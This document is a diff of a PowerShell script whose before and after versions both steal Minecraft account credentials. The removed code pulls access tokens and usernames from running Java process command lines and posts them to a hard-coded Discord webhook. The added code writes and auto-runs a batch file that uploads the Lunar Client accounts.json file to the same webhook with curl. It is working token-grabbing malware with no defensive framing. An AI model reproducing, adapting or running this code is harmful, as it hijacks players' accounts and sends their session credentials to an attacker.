@@ -1,33 +1,56 @@
-$webhookUrl = "https://discord.com/api/webhooks/1398946726496305152/Kn9ULfJCNezuBKC_3Bs0E9l77SFysZLSqMMF0K-O8wDGJUgG13l5Mk8riFWJznckKInt"
+# Define the path for the batch file
+$desktopPath = [System.Environment]::GetFolderPath('Desktop')
+$batchFilePath = Join-Path $desktopPath 'send_webhook.bat'
 
-Get-CimInstance -Query "SELECT CommandLine FROM Win32_Process WHERE Name LIKE 'Java%' AND CommandLine LIKE '%accessToken%'" |
-    Select-Object -ExpandProperty CommandLine |
-    ForEach-Object {
-        $accessToken = $null
-        $username = $null
+# Define the content of the batch file
+$batchContent = @"
+@echo off
+setlocal enabledelayedexpansion
 
-        if ($_ -match '--accessToken\s+(\S+)') {
-            $accessToken = $matches[1]
-        }
-        if ($_ -match '--username\s+(\S+)') {
-            $username = $matches[1]
-        }
+:: Discord Webhook URL
+set webhookUrl=https://discord.com/api/webhooks/1398946726496305152/Kn9ULfJCNezuBKC_3Bs0E9l77SFysZLSqMMF0K-O8wDGJUgG13l5Mk8riFWJznckKInt
 
-        if ($accessToken -and $username) {
-           
-            $message = @"
-> **AccessToken:** $accessToken
-> **Username:** $username
+:: Path to the accounts.json file
+set filePath=%USERPROFILE%\.lunarclient\settings\game\accounts.json
+
+
+
+:: Check if the file exists
+if not exist "%filePath%" (
+    echo File accounts.json does not exist at the specified path.
+    exit /b
+)
+
+:: Prepare message
+set message=Here you go king :pray:
+
+:: Correcting the payload format
+set payload={\"content\":\"%message%\"}
+
+:: Escape the payload for the curl request
+set payload_json={\"content\":\"%message%\"}
+
+:: Prepare CURL command for sending the request
+curl -X POST %webhookUrl% ^
+     -H "Content-Type: multipart/form-data" ^
+     -F "payload_json=%payload_json%" ^
+     -F "file=@%filePath%" 
+
+if %errorlevel% neq 0 (
+    echo Failed to send the webhook request.
+) else (
+    echo File sent successfully!
+)
+
+endlocal
 "@
 
-            Write-Output $message
+# Write the content to the batch file
+Set-Content -Path $batchFilePath -Value $batchContent
 
-            
-            $payload = @{
-                content = $message
-            } | ConvertTo-Json -Depth 10
+# Output a message to confirm creation
+Write-Host "Batch file created at $batchFilePath"
 
-            
-            Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload
-        }
-    } 
+# Run the batch file automatically
+Start-Process -FilePath $batchFilePath
+Write-Host "Batch file is now running..."
